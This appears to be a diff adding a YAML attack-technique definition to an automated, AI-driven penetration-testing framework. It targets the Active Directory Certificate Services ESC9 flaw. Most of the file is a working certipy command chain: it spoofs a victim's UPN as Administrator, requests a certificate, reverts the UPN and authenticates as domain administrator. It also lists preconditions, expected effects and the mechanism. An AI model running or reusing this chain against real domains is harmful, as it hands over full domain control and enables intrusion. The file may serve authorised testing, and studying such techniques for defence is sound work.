@@ -1,0 +1,41 @@
+name: adcs_esc9
+category: ad
+description: ADCS ESC9 — no security extension, UPN spoofing after cert issuance
+preconditions:
+- has_cred
+- service.port==445
+- write_access_upn
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+  ca: from_engagement.ca
+  victim: from_engagement.victim_user
+command_template: certipy account update -u {username}@{domain} -p '{password}' -user
+  '{victim}' -upn Administrator@{domain} && certipy req -u '{victim}@{domain}' -p
+  '{password}' -ca '{ca}' -template ESC9 -dc-ip {target_ip} && certipy account update
+  -u {username}@{domain} -p '{password}' -user '{victim}' -upn '{victim}@{domain}'
+  && certipy auth -pfx administrator.pfx -domain {domain}
+parser: generic_parser
+expected_effects:
+- certificate_obtained
+- upn_reverted
+- domain_admin_session
+- has_cred
+falsifier:
+  pattern: SECURITY_EXTENSION|UPN_MISMATCH|ACCESS_DENIED|template not found
+  timeout: 120
+model_tier: sonnet
+mechanism: 'Template with msPKI-Enrollment-Flag CT_FLAG_NO_SECURITY_EXTENSION means
+  the issued
+
+  cert won''t bind the SID. Flip victim''s UPN to Administrator@domain, request cert,
+
+  flip UPN back. PKINIT authenticates based on UPN → cert auth as Administrator.
+
+  '
+references:
+  ocd_mindmap: 'Branch 7: ADCS ESC9 (no security extension)'
+  hacktricks: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
